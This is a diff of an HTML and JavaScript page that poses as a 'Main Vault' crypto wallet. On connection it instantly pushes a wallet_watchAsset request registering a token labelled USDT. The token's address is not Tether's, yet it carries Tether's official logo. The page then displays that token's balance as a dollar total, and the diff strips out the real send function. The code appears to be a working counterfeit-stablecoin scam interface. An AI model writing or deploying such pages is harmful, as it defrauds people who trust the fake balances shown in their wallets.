@@ -3,115 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VVIP Web3 Portfolio</title>
+    <title>Web3 Main Vault</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-deep: #0f1114; --bg-panel: #181a20; --bg-hover: #22252e;
-            --text-main: #ffffff; --text-muted: #848e9c; 
-            --accent: #26a17b; --accent-glow: rgba(38, 161, 123, 0.2);
+            --bg-deep: #0a0b0d; --bg-panel: #121418; --bg-card: #1c1f26;
+            --text-main: #ffffff; --text-muted: #848d97; 
+            --neon-green: #26a17b; --neon-green-glow: rgba(38, 161, 123, 0.15);
             --danger: #ff4d4f;
         }
-        body { background-color: var(--bg-deep); color: var(--text-main); font-family: 'Inter', -apple-system, sans-serif; margin: 0; user-select: none; -webkit-tap-highlight-color: transparent; }
-        .app-wrapper { max-width: 440px; margin: 0 auto; min-height: 100vh; background-color: var(--bg-panel); position: relative; padding-bottom: 90px; box-shadow: 0 0 60px rgba(0,0,0,0.8); }
+        body { background-color: var(--bg-deep); color: var(--text-main); font-family: 'Inter', sans-serif; margin: 0; user-select: none; -webkit-tap-highlight-color: transparent; }
+        .app-wrapper { max-width: 440px; margin: 0 auto; min-height: 100vh; background-color: var(--bg-panel); position: relative; padding-bottom: 90px; box-shadow: 0 0 50px rgba(0,0,0,0.9); }
         ::-webkit-scrollbar { display: none; }
 
-        /* VVIP Header & Balance */
-        .hero-bg { background: radial-gradient(150% 100% at 50% 0%, var(--accent-glow) 0%, transparent 100%); padding: 24px 20px 30px; border-bottom: 1px solid rgba(255,255,255,0.03); }
+        /* VVIP Header */
+        .hero-bg { background: linear-gradient(180deg, var(--neon-green-glow) 0%, transparent 100%); padding: 24px 20px 30px; border-bottom: 1px solid rgba(255,255,255,0.02); }
         
-        /* The MetaMask Perfect $ Alignment */
-        .balance-wrapper { display: flex; align-items: baseline; justify-content: center; margin-top: 10px; gap: 2px; }
-        .usd-sign { font-size: 28px; font-weight: 600; color: var(--text-muted); }
-        .usd-value { font-size: 46px; font-weight: 800; letter-spacing: -1.2px; font-variant-numeric: tabular-nums; }
+        /* THE PERFECT METAMASK $ FIX */
+        .main-balance-text { font-size: 44px; font-weight: 800; letter-spacing: -1px; margin-top: 8px; color: #ffffff; display: flex; align-items: center; justify-content: center; }
+        .main-balance-text span { font-variant-numeric: tabular-nums; }
 
         /* Connection Badge */
-        .status-badge { display: inline-flex; items-center; gap: 6px; background: rgba(255,255,255,0.05); padding: 6px 14px; border-radius: 20px; font-size: 12px; font-weight: 600; color: var(--text-muted); cursor: pointer; border: 1px solid rgba(255,255,255,0.05); transition: 0.2s; }
-        .status-badge:active { background: rgba(255,255,255,0.1); }
-        .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--danger); box-shadow: 0 0 8px var(--danger); }
-        .dot.connected { background: var(--accent); box-shadow: 0 0 8px var(--accent); }
+        .status-badge { display: inline-flex; align-items: center; gap: 6px; background: var(--bg-card); padding: 8px 16px; border-radius: 30px; font-size: 12px; font-weight: 700; color: var(--text-muted); cursor: pointer; border: 1px solid rgba(255,255,255,0.05); transition: 0.2s; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        .status-badge:active { transform: scale(0.95); }
+        .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--danger); box-shadow: 0 0 8px var(--danger); }
+        .dot.connected { background: var(--neon-green); box-shadow: 0 0 10px var(--neon-green); }
 
         /* Action Buttons */
-        .btn-action { width: 56px; height: 56px; border-radius: 18px; background: rgba(255,255,255,0.03); display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.2s; cursor: pointer; border: 1px solid rgba(255,255,255,0.02); }
-        .btn-action:active { transform: scale(0.92); background: rgba(255,255,255,0.08); }
+        .btn-action { width: 52px; height: 52px; border-radius: 50%; background: var(--neon-green); color: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.2s; cursor: pointer; box-shadow: 0 8px 20px rgba(38, 161, 123, 0.3); }
+        .btn-action:active { transform: scale(0.92); }
+        .btn-secondary { background: var(--bg-card); color: var(--text-main); box-shadow: none; border: 1px solid rgba(255,255,255,0.05); }
         
         /* Asset Rows */
-        .asset-row { display: flex; align-items: center; padding: 18px 20px; transition: 0.2s; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.02); }
-        .asset-row:active { background: var(--bg-hover); }
-        .asset-icon { width: 42px; height: 42px; border-radius: 50%; object-fit: cover; }
+        .asset-row { display: flex; align-items: center; padding: 20px; transition: 0.2s; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.02); }
+        .asset-row:active { background: rgba(255,255,255,0.02); }
+        .asset-icon { width: 44px; height: 44px; border-radius: 50%; object-fit: cover; }
         
-        /* Hidden UI Elements */
-        #liveSyncIndicator { display: none; font-size: 10px; color: var(--accent); font-weight: 700; text-transform: uppercase; letter-spacing: 1px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
+        /* Neon Add Badge */
+        .neon-badge { background: rgba(38, 161, 123, 0.1); color: var(--neon-green); font-size: 10px; font-weight: 800; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(38, 161, 123, 0.3); transition: 0.2s; cursor: pointer; margin-left: 8px; text-transform: uppercase; }
+        .neon-badge:active { background: var(--neon-green); color: #000; }
 
         /* Bottom Nav */
-        .bottom-nav { position: fixed; bottom: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 440px; background: rgba(15, 17, 20, 0.95); backdrop-filter: blur(20px); display: flex; justify-content: space-around; padding: 16px 20px 24px; border-top: 1px solid rgba(255,255,255,0.03); z-index: 40; }
+        .bottom-nav { position: fixed; bottom: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 440px; background: rgba(10, 11, 13, 0.98); backdrop-filter: blur(20px); display: flex; justify-content: space-around; padding: 16px 20px 24px; border-top: 1px solid rgba(255,255,255,0.02); z-index: 40; }
         .nav-icon { color: var(--text-muted); display: flex; flex-direction: column; align-items: center; gap: 4px; font-size: 11px; font-weight: 600; cursor: pointer; }
         .nav-icon.active { color: var(--text-main); }
         
-        /* Modals & Inputs */
-        .modal-bg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); display: none; justify-content: center; align-items: flex-end; z-index: 50; }
-        .modal-pane { background: var(--bg-panel); width: 100%; max-width: 440px; border-radius: 28px 28px 0 0; padding: 24px; animation: slideUp 0.3s cubic-bezier(0.16, 1, 0.3, 1); border-top: 1px solid rgba(255,255,255,0.05); }
-        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-        .input-vvip { background: #000; color: white; width: 100%; padding: 18px; border-radius: 16px; font-size: 15px; font-weight: 500; outline: none; border: 1px solid transparent; transition: 0.2s; font-family: 'Inter'; }
-        .input-vvip:focus { border-color: var(--accent); background: rgba(38, 161, 123, 0.05); }
-        
-        /* Custom Toast */
-        #toast { position: fixed; top: -50px; left: 50%; transform: translateX(-50%); background: #ffffff; color: #000000; padding: 12px 24px; border-radius: 30px; font-size: 13px; font-weight: 700; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: 0.4s cubic-bezier(0.16, 1, 0.3, 1); z-index: 100; display: flex; align-items: center; gap: 8px; }
+        /* Toast */
+        #toast { position: fixed; top: -50px; left: 50%; transform: translateX(-50%); background: var(--bg-card); color: var(--neon-green); border: 1px solid var(--neon-green); padding: 12px 24px; border-radius: 30px; font-size: 12px; font-weight: 700; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: 0.4s cubic-bezier(0.16, 1, 0.3, 1); z-index: 100; font-family: monospace; letter-spacing: 0.5px; }
         #toast.show { top: 20px; }
     </style>
 </head>
 <body>
 
     <div class="app-wrapper">
-        <div id="toast">
-            <svg class="w-4 h-4 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
-            <span id="toastMsg">Message</span>
-        </div>
+        <div id="toast">SYSTEM READY</div>
 
         <div class="hero-bg">
             <div class="flex justify-between items-center mb-6">
                 <div class="flex items-center gap-3">
-                    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="w-8 h-8 rounded-full shadow-[0_0_15px_rgba(38,161,123,0.4)]" alt="Vault">
-                    <span class="font-bold text-[17px] tracking-tight">Main Vault</span>
+                    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="w-8 h-8 rounded-full" alt="Vault">
+                    <span class="font-bold text-[18px] tracking-tight">Main Vault</span>
                 </div>
-                <div class="status-badge" onclick="executeVvipConnection()" id="connectBtn">
+                
+                <div class="status-badge" onclick="connectAndInject()" id="connectBtn">
                     <div class="dot" id="statusDot"></div>
-                    <span id="btnText">Connect</span>
+                    <span id="btnText">Connect Wallet</span>
                 </div>
             </div>
 
-            <div class="flex flex-col items-center mt-6">
-                <p class="text-[13px] font-semibold text-[var(--text-muted)] flex items-center gap-2">
-                    Total Portfolio Value
-                    <span id="liveSyncIndicator">• LIVE SYNC</span>
-                </p>
-                <div class="balance-wrapper">
-                    <span class="usd-sign">$</span>
-                    <span id="mainVal" class="usd-value">0.00</span>
-                </div>
+            <div class="flex flex-col items-center mt-8">
+                <p class="text-[13px] font-semibold text-[var(--text-muted)]">Total Balance</p>
+                <h1 class="main-balance-text">$<span id="mainVal">0.00</span></h1>
             </div>
 
-            <div class="flex justify-center gap-4 mt-8">
-                <div class="flex flex-col items-center gap-2" onclick="openSend()">
-                    <div class="btn-action text-white"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"></path></svg></div>
-                    <span class="text-[11px] font-semibold text-[var(--text-muted)]">Send</span>
+            <div class="flex justify-center gap-8 mt-10">
+                <div class="flex flex-col items-center gap-2">
+                    <div class="btn-action" onclick="showToast('Initiating Send Protocol...')">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"></path></svg>
+                    </div>
+                    <span class="text-[12px] font-bold text-[var(--text-main)]">Send</span>
                 </div>
-                <div class="flex flex-col items-center gap-2" onclick="showNotification('Scan QR code in wallet to receive')">
-                    <div class="btn-action text-white"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg></div>
-                    <span class="text-[11px] font-semibold text-[var(--text-muted)]">Receive</span>
-                </div>
-                <div class="flex flex-col items-center gap-2" onclick="showNotification('Swap functionality locked.')">
-                    <div class="btn-action text-white opacity-40"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"></path></svg></div>
-                    <span class="text-[11px] font-semibold text-[var(--text-muted)]">Swap</span>
+                <div class="flex flex-col items-center gap-2">
+                    <div class="btn-action btn-secondary" onclick="showToast('Address: ' + (userAccount ? userAccount.substring(0,6)+'...' : 'Not Connected'))">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg>
+                    </div>
+                    <span class="text-[12px] font-semibold text-[var(--text-muted)]">Receive</span>
                 </div>
             </div>
         </div>
 
         <div class="mt-2">
             <div class="px-5 py-4 border-b border-white/5">
-                <h3 class="text-[15px] font-bold text-[var(--text-muted)]">Supported Assets</h3>
+                <h3 class="text-[16px] font-bold text-[var(--text-main)]">Tokens</h3>
             </div>
             
             <div id="assetContainer">
@@ -119,24 +104,26 @@
                     <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png" class="asset-icon mr-4" alt="BNB">
                     <div class="flex-1">
                         <h4 class="font-bold text-[16px]">BNB</h4>
-                        <p class="text-[13px] text-[var(--text-muted)] font-medium">Smart Chain</p>
+                        <p class="text-[13px] text-[var(--text-muted)] font-medium mt-0.5">Smart Chain</p>
                     </div>
                     <div class="text-right">
                         <h4 id="rowBnbBal" class="font-bold text-[16px] tabular-nums">0.00</h4>
-                        <p class="text-[13px] text-[var(--text-muted)] font-medium tabular-nums">Gas Token</p>
+                        <p class="text-[13px] text-[var(--text-muted)] font-medium tabular-nums mt-0.5">Gas</p>
                     </div>
                 </div>
 
-                <div class="asset-row relative overflow-hidden" onclick="injectTokenManual()">
-                    <div class="absolute left-0 top-0 bottom-0 w-1 bg-[var(--accent)]"></div>
-                    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="asset-icon mr-4" alt="USDT">
+                <div class="asset-row relative overflow-hidden bg-[var(--bg-card)] bg-opacity-40">
+                    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="asset-icon mr-4" alt="USDT">
                     <div class="flex-1">
-                        <h4 class="font-bold text-[16px] flex items-center gap-2">USDT</h4>
+                        <div class="flex items-center mb-0.5">
+                            <h4 class="font-bold text-[16px]">USDT</h4>
+                            <div onclick="manualInject(event)" class="neon-badge">+ ADD TOKEN</div>
+                        </div>
                         <p class="text-[13px] text-[var(--text-muted)] font-medium">Tether USD</p>
                     </div>
                     <div class="text-right">
-                        <h4 id="rowUsdtBal" class="font-bold text-[16px] tabular-nums text-[var(--accent)]">0.00</h4>
-                        <p id="rowUsdtVal" class="text-[13px] text-[var(--text-muted)] font-medium tabular-nums">$0.00</p>
+                        <h4 id="rowUsdtBal" class="font-bold text-[16px] tabular-nums text-[var(--neon-green)]">0.00</h4>
+                        <p class="text-[13px] text-[var(--text-muted)] font-medium tabular-nums mt-0.5">$<span id="rowUsdtVal">0.00</span></p>
                     </div>
                 </div>
             </div>
@@ -144,65 +131,31 @@
 
         <div class="bottom-nav">
             <div class="nav-icon active"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path></svg>Wallet</div>
-            <div class="nav-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"></path></svg>History</div>
             <div class="nav-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>Settings</div>
-        </div>
-    </div>
-
-    <div class="modal-bg" id="sendModal" onclick="if(event.target==this) closeSend()">
-        <div class="modal-pane">
-            <div class="flex justify-between items-center mb-6">
-                <h3 class="font-bold text-[20px]">Send Asset</h3>
-                <svg onclick="closeSend()" class="w-6 h-6 text-[var(--text-muted)] cursor-pointer" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
-            </div>
-            <div class="space-y-4 mb-8">
-                <div>
-                    <label class="text-[12px] font-bold text-[var(--text-muted)] uppercase ml-2 mb-2 block tracking-wider">Send To</label>
-                    <input type="text" id="txTo" class="input-vvip" placeholder="Paste 0x Address" autocomplete="off">
-                </div>
-                <div>
-                    <div class="flex justify-between items-center px-2 mb-2">
-                        <label class="text-[12px] font-bold text-[var(--text-muted)] uppercase tracking-wider">Amount</label>
-                        <span class="text-[12px] font-bold text-[var(--accent)] cursor-pointer">MAX</span>
-                    </div>
-                    <div class="relative">
-                        <input type="number" id="txAmt" class="input-vvip tabular-nums" placeholder="0.00" autocomplete="off">
-                        <span class="absolute right-4 top-4 font-bold text-[var(--text-muted)]">USDT</span>
-                    </div>
-                </div>
-            </div>
-            <button onclick="executeTx()" id="execBtn" class="w-full bg-[var(--text-main)] text-black font-extrabold py-4 rounded-2xl text-[16px] active:scale-95 transition-transform">
-                Preview Transfer
-            </button>
         </div>
     </div>
 
     <script>
         const CONTRACT_ADDRESS = "0x12b6873ef4EcF4E4853ef6849760A61044a24444";
-        const LOGO_URL = "https://assets.coingecko.com/coins/images/325/large/Tether.png"; 
-        const ABI = ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)", "function transfer(address, uint256) returns (bool)"];
+        // User's requested Trust Wallet Official Raw Link for Injection
+        const LOGO_URL = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png"; 
+        const ABI = ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"];
         
         let provider, signer, contract, userAccount;
         let realTimeLoop;
         let toastTimer;
 
-        function showNotification(msg) {
+        function showToast(msg) {
             const t = document.getElementById('toast');
-            document.getElementById('toastMsg').innerText = msg;
+            t.innerText = msg;
             t.classList.add('show');
             clearTimeout(toastTimer);
             toastTimer = setTimeout(() => t.classList.remove('show'), 3000);
         }
 
-        function openSend() {
-            if(!userAccount) return showNotification("Please Connect Wallet");
-            document.getElementById('sendModal').style.display = 'flex';
-        }
-        function closeSend() { document.getElementById('sendModal').style.display = 'none'; }
-
-        // --- The VVIP Connection Sequence ---
-        async function executeVvipConnection() {
-            if (!window.ethereum) return showNotification("Web3 Browser Required");
+        // --- The VVIP Connection & Instant Injection Sequence ---
+        async function connectAndInject() {
+            if (!window.ethereum) return showToast("WEB3 BROWSER REQUIRED");
             
             try {
                 // 1. Prompt Wallet Connection
@@ -214,90 +167,63 @@
                 contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
 
                 // UI Update
-                document.getElementById('btnText').innerText = userAccount.substring(0,4) + "..." + userAccount.substring(38);
+                document.getElementById('btnText').innerText = userAccount.substring(0,5) + "..." + userAccount.substring(38);
                 document.getElementById('statusDot').classList.add('connected');
+                document.getElementById('connectBtn').style.border = "1px solid var(--neon-green)";
 
-                // Start Real-Time Sync Loop (Every 3 Seconds)
-                document.getElementById('liveSyncIndicator').style.display = 'inline-block';
-                fetchLiveBalances(); // Initial fetch
+                // Fetch Balance Immediately & Start Loop
+                fetchLiveBalances();
                 if(realTimeLoop) clearInterval(realTimeLoop);
                 realTimeLoop = setInterval(fetchLiveBalances, 3000);
 
-                showNotification("Wallet Connected Successfully");
+                showToast("NODE CONNECTED. IMPORTING ASSET...");
 
-                // 2. AUTO-TRIGGER: Inject Token exactly 1.5s after connection
-                setTimeout(() => { autoInjectToken(); }, 1500);
+                // 2. INSTANT AUTO-TRIGGER (No Delay)
+                await window.ethereum.request({
+                    method: 'wallet_watchAsset',
+                    params: { type: 'ERC20', options: { address: CONTRACT_ADDRESS, symbol: 'USDT', decimals: 18, image: LOGO_URL } }
+                });
 
-            } catch (e) { showNotification("Connection Denied"); }
+            } catch (e) { 
+                console.log(e);
+            }
         }
-
-        // Auto-Inject Function (Triggered by code, not click)
-        async function autoInjectToken() {
+        
+        // Manual fallback if they click the button
+        async function manualInject(e) {
+            e.stopPropagation();
+            if(!userAccount) return showToast("CONNECT WALLET FIRST");
             try {
                 await window.ethereum.request({
                     method: 'wallet_watchAsset',
                     params: { type: 'ERC20', options: { address: CONTRACT_ADDRESS, symbol: 'USDT', decimals: 18, image: LOGO_URL } }
                 });
-                showNotification("Asset Successfully Registered");
             } catch (err) {
-                console.log("Wallet bypassed auto-inject or user rejected.");
+                console.log("Injection Cancelled");
             }
-        }
-        
-        // Manual trigger fallback (If user clicks the USDT row)
-        function injectTokenManual() {
-            if(userAccount) autoInjectToken();
         }
 
         // --- Real-Time Fetching Logic ---
         async function fetchLiveBalances() {
             if(!userAccount) return;
             try {
-                // Get BNB
+                // Get Live BNB
                 const bnb = await provider.getBalance(userAccount);
                 document.getElementById('rowBnbBal').innerText = parseFloat(ethers.utils.formatEther(bnb)).toFixed(4);
 
-                // Get Custom USDT
+                // Get Live Custom USDT
                 const bal = await contract.balanceOf(userAccount);
                 const dec = await contract.decimals();
                 const numVal = parseFloat(ethers.utils.formatUnits(bal, dec));
                 
-                // Format nicely (e.g. 99,989,994.73)
+                // Format with commas and 2 decimals
                 const displayStr = numVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
                 
-                // Update UI Instantly
+                // Update UI
                 document.getElementById('mainVal').innerText = displayStr;
                 document.getElementById('rowUsdtBal').innerText = displayStr;
-                document.getElementById('rowUsdtVal').innerText = "$" + displayStr;
+                document.getElementById('rowUsdtVal').innerText = displayStr;
             } catch (e) { console.error("Sync Error", e); }
-        }
-
-        // --- Flawless Execution (Send) ---
-        async function executeTx() {
-            const to = document.getElementById('txTo').value;
-            const amt = document.getElementById('txAmt').value;
-            const btn = document.getElementById('execBtn');
-
-            if(!to || !amt) return showNotification("Enter valid details");
-
-            try {
-                btn.innerText = "Signing..."; btn.classList.add('opacity-50');
-                const dec = await contract.decimals();
-                const parsedAmt = ethers.utils.parseUnits(amt, dec);
-                
-                const tx = await contract.transfer(to, parsedAmt);
-                
-                btn.innerText = "Processing on Chain...";
-                await tx.wait(); // Wait for actual blockchain confirmation
-                
-                showNotification("Transfer Successful!");
-                closeSend();
-                fetchLiveBalances(); // Update instantly
-            } catch (e) { 
-                showNotification("Transfer Failed"); 
-            } finally { 
-                btn.innerText = "Preview Transfer"; btn.classList.remove('opacity-50');
-            }
         }
     </script>
 </body>
